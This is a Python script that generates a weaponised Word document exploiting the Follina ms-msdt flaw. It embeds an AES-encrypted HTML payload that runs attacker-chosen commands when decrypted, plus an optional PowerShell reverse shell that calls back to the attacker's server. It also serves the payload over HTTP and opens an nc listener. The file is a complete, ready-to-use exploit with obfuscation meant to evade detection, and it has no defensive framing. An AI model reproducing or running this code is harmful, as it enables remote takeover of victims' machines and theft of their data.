#!/usr/bin/env python3

import argparse
import zipfile
import tempfile
import shutil
import os
import netifaces
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
import threading
import re
from Crypto.Cipher import AES
import Crypto.Cipher.AES
import binascii

parser = argparse.ArgumentParser()

parser.add_argument(
    "--command",
    "-c",
    default="calc",
    help="command to run on the target (default: calc)",
)

parser.add_argument(
    "--output",
    "-o",
    default="./follina.doc",
    help="output maldoc file (default: ./follina.doc)",
)

parser.add_argument(
    "--interface",
    "-i",
    default="eth0",
    help="network interface or IP address to host the HTTP server (default: eth0)",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    default="8000",
    help="port to serve the HTTP server (default: 8000)",
)

parser.add_argument(
    "--reverse",
    "-r",
    type=int,
    default="0",
    help="port to serve reverse shell on",
)


def main(args):

    # Parse the supplied interface
    # This is done so the maldoc knows what to reach out to.
    try:
        serve_host = ipaddress.IPv4Address(args.interface)
    except ipaddress.AddressValueError:
        try:
            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0][
                "addr"
            ]
        except ValueError:
            print(
                "[!] error detering http hosting address. did you provide an interface or ip?"
            )
            exit()

    # Copy the Microsoft Word skeleton into a temporary staging folder
    doc_suffix = "doc"
    staging_dir = os.path.join(
        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())
    )
    doc_path = os.path.join(staging_dir, doc_suffix)
    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))
    print(f"[+] copied staging doc {staging_dir}")

    # Prepare a temporary HTTP server location
    serve_path = os.path.join(staging_dir, "www")
    os.makedirs(serve_path)

    # Modify the Word skeleton to include our HTTP server
    document_rels_path = os.path.join(
        staging_dir, doc_suffix, "word", "_rels", "document.xml.rels"
    )

    with open(document_rels_path) as filp:
        external_referral = filp.read()

    external_referral = external_referral.replace(
        "{server_host}", f"{serve_host}"
    )
    external_referral = external_referral.replace(
        "{server_port}", f"{args.port}"
    )

    with open(document_rels_path, "w") as filp:
        filp.write(external_referral)

    # Rebuild the original office file
    shutil.make_archive(args.output, "zip", doc_path)
    os.rename(args.output + ".zip", args.output)

    print(f"[+] created maldoc {args.output}")

    command = args.command
    if args.reverse:
        command = f"""$client = New-Object System.Net.Sockets.TCPClient("{serve_host}",{args.reverse});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    # Base64 encode our command so whitespace is respected
    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
    #starting encrypting
    print(f"[+] Encrypting script with AES")
    script_payload = f"""location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    script_payload += "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
    key = "".join([random.choice(string.ascii_lowercase) for _ in range(16)])
    cipher = AES.new(key, AES.MODE_ECB)
    enc_script = binascii.b2a_hex(cipher.encrypt(script_payload*16))
    enc_script = enc_script.decode('utf-8')

    # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
    html_payload = f"""<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>\n<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/aes-min.js"></script>\n<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/mode-ecb-min.js"></script>\n<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/pad-nopadding-min.js"></script>\n"""
    html_payload += f"""<script>\nvar encrypted = '{enc_script}',\nkey = CryptoJS.enc.Hex.parse('{''.join(hex(ord(x))[2:] for x in key)}'),\ncipherParams = CryptoJS.lib.CipherParams.create({{\nciphertext: CryptoJS.enc.Hex.parse(encrypted)\n}});\nvar decrypted3 = CryptoJS.AES.decrypt(cipherParams, key, {{mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.NoPadding }});\neval(CryptoJS.enc.Utf8.stringify(decrypted3));\n</script>"""
    
    # Create our HTML endpoint
    with open(os.path.join(serve_path, "index.html"), "w") as filp:
        filp.write(html_payload)

    class ReuseTCPServer(socketserver.TCPServer):
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(self.server_address)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=serve_path, **kwargs)

        def log_message(self, format, *func_args):
            if args.reverse:
                return
            else:
                super().log_message(format, *func_args)

        def log_request(self, format, *func_args):
            if args.reverse:
                return
            else:
                super().log_request(format, *func_args)

    def serve_http():
        with ReuseTCPServer(("", args.port), Handler) as httpd:
            httpd.serve_forever()

    # Host the HTTP server on all interfaces
    print(f"[+] serving html payload on :{args.port}")
    if args.reverse:
        t = threading.Thread(target=serve_http, args=())
        t.start()
        print(f"[+] starting 'nc -lvnp {args.reverse}' ")
        os.system(f"nc -lnvp {args.reverse}")

    else:
        serve_http()


if __name__ == "__main__":

    main(parser.parse_args())
